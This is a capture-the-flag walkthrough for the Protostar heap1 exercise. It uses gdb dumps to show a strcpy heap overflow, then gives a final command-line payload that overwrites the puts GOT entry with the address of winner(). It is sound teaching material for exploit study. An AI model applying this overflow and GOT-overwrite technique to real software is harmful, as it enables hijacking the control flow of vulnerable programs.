## HEAP 1 ###

### Source Code ###

From the source code, we know that we need two inputs. Besides, we can try to
probe with gdb for this reason. If we try with zero, or one inputs, we will get
SIGSEGV.
If we try with two short inputs, nothing is gonna break.

Let's try with a long input
```
/opt/protostar/bin/heap1 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV 0000111122223333444455556666777788889999
```
Stack before break
```
eax            0x804a018        134520856
ecx            0xb7fd93a0       -1208118368
edx            0xbffff91f       -1073743585
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff710       0xbffff710
ebp            0xbffff738       0xbffff738
esi            0x0      0
edi            0x0      0
eip            0x8048538        0x8048538 <main+127>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8048538 <main+127>:   call   0x804838c <strcpy@plt>
0x804853d <main+132>:   mov    0xc(%ebp),%eax
```
And after it breaks
```
Program received signal SIGSEGV, Segmentation fault.
eax            0x46464646       1179010630
ecx            0x30     48
edx            0x0      0
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff700       0xbffff700
ebp            0xbffff708       0xbffff708
esi            0x46464645       1179010629
edi            0xbffff978       -1073743496
eip            0xb7f09df4       0xb7f09df4 <*__GI_strcpy+20>
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x42424242
0x804a020:      0x43434343      0x44444444      0x45454545      0x46464646
0x804a030:      0x47474747      0x48484848      0x49494949      0x4a4a4a4a
0x804a040:      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d      0x4e4e4e4e
0x804a050:      0x4f4f4f4f      0x50505050      0x51515151      0x52525252
0x804a060:      0x53535353      0x54545454      0x55555555      0x56565656
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0xb7f09df4 <*__GI_strcpy+20>:   mov    %cl,0x1(%esi,%edx,1)
0xb7f09df8 <*__GI_strcpy+24>:   add    $0x1,%edx
*__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffff978 "0000111122223333444455556666777788889999") at strcpy.c:40
40      strcpy.c: No such file or directory.
        in strcpy.c
```
That means we can use the second argument to write to an address supplied in the
first argument. 

In order to redirect the code to *winner*, we need to overwrite the GOT entry of
the last printf to the address of the *winner()* function. Let's use the above
reason to do so. First of all, we need to find the address of *winner()*
function and the GOT entry of the last *printf*
```
(gdb) p winner
$8 = {void (void)} 0x8048494 <winner>

Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:        jmp    *0x8049774
0x080483d2 <puts@plt+6>:        push   $0x30
0x080483d7 <puts@plt+11>:       jmp    0x804835c
End of assembler dump.
(gdb) x/wx 0x8049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:   0x080483d2
```
That means we need to write 0x8048494 into the address of 0x8049774.

```
/opt/protostar/bin/heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`"  "`/bin/echo -ne "\x94\x84\x04\x08"`"
and we have a winner @ 1628567987
```

